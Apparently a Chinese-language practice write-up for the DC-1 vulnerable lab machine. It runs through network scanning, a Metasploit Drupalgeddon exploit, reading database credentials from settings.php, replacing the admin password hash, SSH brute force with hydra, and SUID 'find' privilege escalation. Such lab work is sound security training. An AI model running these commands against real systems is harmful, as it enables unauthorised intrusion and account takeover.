## five86 靶机练习
### 地址
1. http://www.five86.com/

### DC-1
1. url DC-1: https://www.jianshu.com/p/b659f4619c88
2. drupal
   - http://drupalchina.cn/download
   - https://www.drupal.org/download


### step
1. 下载DC-1:VMware导入
2. nmap 或arp-scan 发现主机 192.168.221.133
   - eg:arp-scan -l
   - eg: namp -sP 192.168.221.0/24 -oN nmap.sP
3. 扫描端口
   - eg:用masscan快速扫描端口 masscan -p1-65535 192.168.221.133 --rate=1000
   - eg:nmap -A 192.168.2.195 -oN nmap_195.A
4. download drupal
5. 搜索漏洞:google,baidu
   - RCE 漏洞（名为 drupalddon2 (CVE-2018-7600)
   - CVE-2018-7600分析:http://blog.nsfocus.net/cve-2018-7600-drupal-7-x/
   - github:https://github.com/pimps/CVE-2018-7600
   - 攻击者开发利用 Drupalgeddon2 漏洞将加密货币矿工、后门程序和其他恶意软件注入网站。
   - SQL注入漏洞：https://www.freebuf.com/vuls/47271.html
   - CVE-2012-4553

6. 启动msfconsole
   - msfconsole
   - search drupal
   - use exploit/multi/http/drupal_drupageddon
   - set RHOST 192.168.221.133
   - run
   - shell
   - id
   - whoami
   - 标准shell获取:python -c "import pty;pty.spawn('/bin/bash')"

7. Drupal的默认配置文件为  /var/www/sites/default/settings.php，查看
```
$databases = array (
        'default' => 
        array (
            'default' => 
            array (
                'database' => 'drupaldb',
                'username' => 'dbuser',
                'password' => 'R0ck3t',
                'host' => 'localhost',
                'port' => '',
                'driver' => 'mysql',
                'prefix' => '',
                ),
            ),
        );

```
8. 连接MySQL 找到用户表 查找用户
   select * from users\G;
9. 发现admin用户置换密码
   - old password:$S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR
   - 方法:http://drupalchina.cn/node/2128
   - php scripts/password-hash.sh admin
   - password: 123456 hash: $S$DdB6oJKULtKFyEUadFua8fODXmnwhnO9OAsWeGN7i0JFGHf.zb9H

10. 新密码登录
11. find查看有root权限应用 find / -perm -4000 2>/dev/null
12. 尝试爆破 hydra -l flag4 -P passlist.dic 192.168.221.133 ssh -o hydra.ssh -vV -f
13. find提权 find flag1.txt -exec '/bin/sh' \;
14. id查看

### help
1. https://www.jianshu.com/p/b659f4619c88
2. https://www.cnblogs.com/nanlu/p/11347438.html
